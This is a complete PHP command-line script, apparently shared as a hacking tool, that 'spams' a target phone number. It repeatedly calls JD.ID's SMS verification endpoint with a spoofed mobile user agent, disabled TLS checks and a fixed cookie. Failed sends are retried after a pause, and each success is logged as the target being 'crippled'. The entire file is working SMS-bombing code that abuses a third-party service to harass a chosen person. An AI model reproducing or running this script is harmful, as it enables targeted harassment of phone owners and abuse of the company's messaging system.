<?php
/* 
JD.ID Spam Code
Coded by : Ilham HaX0r
Recided by : ./CrazyError.19
Github :https://github.com/CrazyError
Github : https://github.com/ilhamhax0r
*/
echo "\e[93mSpam JD.Id 
\e[36m<<<<<<<<<<<\e[91m>>>>>>>>>>\n\e[36mAuthor : Ilham HaX0r
ReCoded by : ./CE.19
Github : https://github.com/CrazyError/
Github : https://github.com/ilhamhax0r/
\e[36m<<<<<<<<<<<\e[91m>>>>>>>>>>";
echo "\n\e[36mNomor Target : ";
$no = trim(fgets(STDIN, 1024));
echo "Jumlah Sms     : ";
$loop = trim(fgets(STDIN, 1024));
echo "\e[36m<<<<<<<<<=\e[91m=>>>>>>>>>\n\e[96m\e[5mLogs:\n";
for ($x=1; $x<=$loop; $x++) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://passport.jd.id/sms/sendSMSCode");
	curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
	    'Accept: application/json, text/javascript, */*; q=0.01',
	    'Accept-Language: en-US,en;q=0.5',
	    'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
	    'Connection: keep-alive',
	    'Host: passport.jd.id',
	    'Cookie: __jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3',
	    'Referer: https://passport.jd.id/register/phone',
	    'X-Requested-With: XMLHttpRequest'
	));
	curl_setopt($c, CURLOPT_POSTFIELDS,"phone=".$no);
	curl_setopt($c, CURLOPT_POST, 1);
	$hasil = curl_exec($c);
	if ($hasil == "true") {
		echo "\e[92m$x. Target Berhasil Si Lumpuhkan\n";
		flush();
		sleep(1);
	} else {
		$loop += 1;
		echo "\e[91m$x. Target Gagal Di Bunuh\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
		flush();
		sleep(60);
	}
}
echo "\e[36m>>>>>>>>>==\e[91m==<<<<<<<<<\n";
echo "\e[39mThanks For You";
?>